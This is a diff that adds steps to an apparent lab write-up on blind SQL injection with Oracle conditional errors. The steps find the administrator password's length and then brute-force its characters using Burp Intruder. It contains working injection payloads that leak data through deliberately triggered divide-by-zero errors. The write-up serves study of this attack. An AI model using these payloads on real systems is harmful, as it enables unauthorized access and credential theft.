@@ -100,3 +100,49 @@ The initial string will just test if the password is more that 1 character long.
 ```sql
 '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')--
 ```
+I can then set the payload position at the number I am comparing the password length to:
+
+![image](https://user-images.githubusercontent.com/83407557/169927613-cead1037-ddf6-49a4-9c06-119f40cfd87d.png)
+
+And will set a sniper payload that is a set of numbers ranging from 1-30.
+
+![image](https://user-images.githubusercontent.com/83407557/169927748-e8979edf-4647-4628-944f-71c6454a2ada.png)
+
+This attack should error out until the password length is given from the set of numbers
+
+![image](https://user-images.githubusercontent.com/83407557/169927902-6466f9bd-ea4c-4158-b194-959cb4a5fe88.png)
+
+because the is password > 20 did not return an error, this lets me know that the password is 20 characters long.
+
+# STEP 5 Use substring method to guess 20 character long password
+
+In a similar fasion I can create a query that can guess the password one character at a time, until all 20 are guessed. 
+
+The initial query string:
+
+```sql
+#This tests if the first character is an 'a'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
+
+#This would check if the second character was 'b'
+'||(SELECT CASE WHEN SUBSTR(password,2,1)='b' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
+```
+
+With that in mind, lets build a burp intruder attack:
+
+It will be a cluster bomb, with two payload positions. The first at the substring number, the second at the letter we are guessing.
+
+![image](https://user-images.githubusercontent.com/83407557/169928628-e02b9304-e80c-4b53-9e4f-01d218dcb705.png)
+
+The first payload will be the number 1-20
+
+![image](https://user-images.githubusercontent.com/83407557/169928707-11642282-9a35-4c3a-804c-d85307f4061e.png)
+
+the second is a brute force with all lowercase letters and the numbers 0-9.
+
+![image](https://user-images.githubusercontent.com/83407557/169928811-7c43b756-79ee-4c82-83bb-752a0df3e34f.png)
+
+As you can see this will create a lot of requests, so go get a coffee at the farther place that is a little more fancy (if you are on burp community like me). However we just are interested in the 20 responses that are errors, so after a nap, we should have the password.
+
+
+
